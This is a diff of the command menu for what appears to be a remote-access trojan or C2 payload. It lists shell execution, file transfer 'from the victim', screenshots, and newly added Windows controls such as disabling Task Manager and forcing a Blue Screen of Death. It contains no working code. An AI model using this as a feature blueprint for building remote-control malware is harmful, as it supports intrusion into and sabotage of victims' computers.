@@ -1,7 +1,15 @@
-shell <command>   - Execute a shell command
-cd <directory>    - Change current directory
-pwd               - Print working directory
-download <path>   - Download a file from the victim
-upload <path>     - Upload a file to the victim
-screenshot        - Take a compressed screenshot
-terminate         - Kill the payload process
+--- File System ---
+shell <cmd>         - Execute shell command
+cd <dir>            - Change directory
+pwd                 - Get current directory
+upload <local> [rem]- Upload file
+download <remote>   - Download file
+screenshot          - Capture screen
+--- System Control (Windows) ---
+reboot              - Reboot the system
+shutdown            - Shutdown the system
+disable_taskmgr     - Disable Task Manager
+enable_taskmgr      - Enable Task Manager
+bsod                - Trigger Blue Screen of Death
+--- C2 Control ---
+terminate           - Kill the payload
